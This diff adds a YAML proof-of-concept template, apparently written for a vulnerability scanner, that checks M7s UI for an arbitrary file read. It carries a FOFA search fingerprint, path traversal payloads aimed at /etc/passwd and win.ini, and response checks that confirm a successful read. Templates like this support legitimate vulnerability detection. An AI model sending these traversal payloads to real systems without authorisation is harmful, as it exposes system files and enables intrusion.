@@ -1,0 +1,20 @@
+id: poc-yaml-m7s-ui-open-anyfile-read
+info:
+  name: M7s UI open 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: m7s-ui
+  fofa: body="static/js/chunk-libs.9540f991.js"
+variables:
+  paths: '../C://Windows/win.ini
+
+    ../../../../../../../../../../../etc/passwd
+
+    '
+requests:
+- method: GET
+  path: /api/logrotate/open?file={{.paths}}
+  expression: status_code == 200 && ( (contains(body,"root:") && contains(body,"/bin"))
+    || (contains(body,"[files]") && contains(body,"bit app support")) )
+transport: http
